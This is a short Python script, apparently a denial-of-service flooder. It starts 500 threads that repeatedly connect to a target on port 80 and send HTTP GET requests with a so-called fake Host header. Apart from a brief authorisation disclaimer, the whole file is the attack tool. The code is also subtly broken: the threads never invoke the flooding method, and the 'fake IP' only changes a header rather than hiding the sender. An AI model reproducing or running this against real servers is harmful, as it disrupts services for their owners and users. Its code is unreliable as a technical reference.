import threading
import socket

# Do not attempt on public IP unless you're authorised
# Here HTTP port number is used, feel free to use other ports
target_ip, http_port, fake_ip = '0.0.0.0', 80, '0.0.0.0'
connection_counter = 0


class Ddos(threading.Thread):
    def __init__(self, target_ip, http_port, fake_ip):
        super().__init__()
        self.target_ip = target_ip
        self.http_port = http_port
        self.fake_ip = fake_ip
        self.start_script = True

    def ddos(self):
        while self.start_script:
            new_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            new_socket.connect((target_ip, http_port))
            new_socket.sendto(('GET /' + target_ip + ' HTTP/1.1\r\n').encode('ascii'), (target_ip, http_port))
            new_socket.sendto(('Host: ' + fake_ip + '\r\n\r\n').encode('ascii'), (target_ip, http_port))
            new_socket.close()

            global connection_counter
            connection_counter += 1

            if connection_counter % 500 == 0:
                return connection_counter

    def __repr__(self):
        return str(self.ddos())


for i in range(500):
    start_thread = Ddos(target_ip, http_port, fake_ip)
    start_thread.start()
